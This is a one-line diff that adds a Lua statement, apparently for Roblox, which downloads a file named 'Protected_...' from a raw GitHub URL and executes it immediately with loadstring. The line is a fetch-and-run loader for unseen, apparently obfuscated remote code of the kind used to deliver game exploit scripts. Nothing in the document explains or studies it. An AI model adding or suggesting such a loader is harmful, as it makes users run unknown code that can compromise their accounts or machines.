@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/FishyPlayzThis/key-idk/refs/heads/main/Protected_9461089315963054.txt",true))()
